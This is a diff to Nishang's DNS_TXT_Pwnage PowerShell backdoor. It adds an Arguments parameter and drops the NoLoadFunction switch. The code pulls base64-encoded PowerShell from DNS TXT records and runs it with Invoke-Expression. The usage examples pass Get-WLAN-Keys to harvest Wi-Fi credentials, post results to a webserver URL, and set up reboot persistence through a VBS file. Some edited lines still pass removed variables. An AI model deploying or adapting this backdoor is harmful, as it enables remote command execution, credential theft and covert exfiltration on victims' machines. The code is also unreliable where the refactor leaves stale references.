@@ -30,6 +30,9 @@ The domain (or subdomain) whose TXT records would be used to issue commands to t
 .PARAMETER psdomain
 The domain (or subdomain) whose subdomains would be used to provide powershell scripts from TXT records.
 
+.PARAMETER Arguments
+Arguments to be passed to a script. Powerpreter and other scripts in Nishang need the function name and arguments here.
+
 .PARAMETER subdomains
 The number of subdomains which would be used to provide powershell scripts from their TXT records.
 The length of DNS TXT records is assumed to be 255 characters, so more than one subdomains would be required.
@@ -74,17 +77,12 @@ Usually, you should let the Name Server of target to resolve things for you.
 Use this parameter for reboot persistence. 
 Use Remove-Peristence from the Utility folder to clean a target machine.
 
-.PARAMETER NoLoadFunction
-This parameter is used for specifying that the script used in txt records $psdomain does NOT load a function.
-If the parameter is not specified the payload assumes that the script pulled from txt records would need function name to be executed.
-This need not be specified if you are using Nishang scripts with this backdoor.
-
 .EXAMPLE
 PS > DNS_TXT_Pwnage
 The payload will ask for all required options.
 
 .EXAMPLE
-PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain script.alteredsecurity.com -Subdomains 3 -StopString stop -AuthNS ns8.zoneedit.com
+PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain script.alteredsecurity.com -Arguments Get-WLAN-Keys -Subdomains 3 -StopString stop -AuthNS ns8.zoneedit.com
 In the above example if you want to execute commands. TXT record of start.alteredsecurity.com
 must contain only "begincommands" and command.alteredsecurity.com should conatin a single command 
 you want to execute. The TXT record could be changed live and the payload will pick up updated 
@@ -92,14 +90,15 @@ record to execute new command.
 
 To execute a script in above example, start.alteredsecurity.com must contain "startscript". As soon it matches, the payload will query 
 1.script.alteredsecurity.com, 2.script.alteredsecurity.com and 3.script.alteredsecurity.com looking for a base64encoded powershell script. 
+Use the Arguments paramter if the downloaded script loads a function.
 Use the Out-DnsTxt script in the Utility folder to encode scripts to base64.
 
 .EXAMPLE
-PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain encscript.alteredsecurity.com -StopString stop -AuthNS ns8.zoneedit.com -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
+PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain script.alteredsecurity.com -Arguments Get-WLAN-Keys -Subdomains 3 -StopString stop -AuthNS ns8.zoneedit.com -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
 Use above command for sending POST request to your webserver which is able to log the requests.
 
 .EXAMPLE
-PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain encscript.alteredsecurity.com -StopString stop -AuthNS ns8.zoneedit.com -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php -persist
+PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain script.alteredsecurity.com -Arguments Get-WLAN-Keys -Subdomains 3 -StopString stop -AuthNS ns8.zoneedit.com -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php -persist
 Use above for reboot persistence.
 
 .LINK
@@ -115,10 +114,6 @@ https://github.com/samratashok/nishang
         [Parameter(Parametersetname="exfil")]
         [Switch]
         $exfil,
-
-        [Parameter(Parametersetname="exfil")]
-        [Switch]
-        $NoLoadFunction,
 
         [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")]
         [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")]
@@ -145,52 +140,57 @@ https://github.com/samratashok/nishang
         [String]
         $psdomain,
 
-        [Parameter(Position = 5, Mandatory = $True, Parametersetname="exfil")]
-        [Parameter(Position = 5, Mandatory = $True, Parametersetname="noexfil")]
+        [Parameter(Position = 5, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 5, Mandatory = $False, Parametersetname="noexfil")]
         [String]
-        $Subdomains,
+        $Arguments = "Out-Null",
 
         [Parameter(Position = 6, Mandatory = $True, Parametersetname="exfil")]
         [Parameter(Position = 6, Mandatory = $True, Parametersetname="noexfil")]
         [String]
+        $Subdomains,
+
+        [Parameter(Position = 7, Mandatory = $True, Parametersetname="exfil")]
+        [Parameter(Position = 7, Mandatory = $True, Parametersetname="noexfil")]
+        [String]
         $StopString,
 
-        [Parameter(Position = 7, Mandatory = $False, Parametersetname="exfil")]
-        [Parameter(Position = 7, Mandatory = $False, Parametersetname="noexfil")]
+        [Parameter(Position = 8, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 8, Mandatory = $False, Parametersetname="noexfil")]
         [String]$AuthNS,    
 
-        [Parameter(Position = 8, Mandatory = $False, Parametersetname="exfil")] [ValidateSet("gmail","pastebin","WebServer","DNS")]
+        [Parameter(Position = 9, Mandatory = $False, Parametersetname="exfil")] [ValidateSet("gmail","pastebin","WebServer","DNS")]
         [String]
         $ExfilOption,
 
-        [Parameter(Position = 9, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 10, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $dev_key = "null",
 
-        [Parameter(Position = 10, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 11, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $username = "null",
 
-        [Parameter(Position = 11, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 12, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $password = "null",
 
-        [Parameter(Position = 12, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 13, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $URL = "null",
       
-        [Parameter(Position = 13, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 14, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $DomainName = "null",
 
-        [Parameter(Position = 14, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 15, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $ExfilNS = "null"
    
    )
 
     $body = @'    
-function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $psdomain, $Stopstring, $AuthNS, $ExfilOption, $dev_key, $username, $password, $URL, $DomainName, $ExfilNS, $exfil, $LoadFunction)
+function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $psdomain, $Arguments, $Stopstring, $AuthNS, $ExfilOption, $dev_key, $username, $password, $URL, $DomainName, $ExfilNS, $exfil)
 {
     while($true)
     {
@@ -264,17 +264,15 @@ function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $ps
             $cs = New-Object System.IO.Compression.DeflateStream ($ms, [System.IO.Compression.CompressionMode]::Decompress)
             $sr = New-Object System.IO.StreamReader($cs)
             $command = $sr.readtoend()
-            # Check for the function loaded by the script.
-            $preloading = Get-ChildItem function:\
-            Invoke-Expression $command
-            $postloading = Get-ChildItem function:\
-            $diffobj = Compare-Object $preloading $postloading
-            $FunctionName = $diffobj.InputObject.Name
-            $pastevalue = Invoke-Expression $FunctionName
-            if ($NoLoadFunction -eq $True)
+            
+            $script:pastevalue = Invoke-Expression $command
+
+            # Check for arguments to the downloaded script.
+            if ($Arguments -ne "Out-Null")
             {
-                $pastevalue = Invoke-Expression $command
+                $pastevalue = Invoke-Expression $Arguments                   
             }
+
             $pastevalue            
             $exec++
             if ($exfil -eq $True)
@@ -383,10 +381,10 @@ function Do-Exfiltration($pastename,$pastevalue,$ExfilOption,$dev_key,$username,
     if($persist -eq $True)
     {
         $name = "persist.vbs"
-        $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS $LoadFuntion"
+        $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Arguments $Stopstring $AuthNS"
         if ($exfil -eq $True)
         {
-            $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS $ExfilOption $dev_key $username $password $URL $DomainName $ExfilNS $exfil $LoadFunction"
+            $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Arguments $Stopstring $AuthNS $ExfilOption $dev_key $username $password $URL $DomainName $ExfilNS $exfil"
         }
         Out-File -InputObject $body -Force $env:TEMP\$modulename
         Out-File -InputObject $exfiltration -Append $env:TEMP\$modulename
@@ -418,11 +416,11 @@ function Do-Exfiltration($pastename,$pastevalue,$ExfilOption,$dev_key,$username,
     }
     else
     {
-        $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS $LoadFuntion"
+        $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Arguments $Stopstring $AuthNS $LoadFuntion"
 
         if ($exfil -eq $True)
         {
-            $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS $ExfilOption $dev_key $username $password $URL $DomainName $ExfilNS $exfil $LoadFunction"
+            $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Arguments $Stopstring $AuthNS $ExfilOption $dev_key $username $password $URL $DomainName $ExfilNS $exfil $LoadFunction"
         }
         Out-File -InputObject $body -Force $env:TEMP\$modulename
         Out-File -InputObject $exfiltration -Append $env:TEMP\$modulename
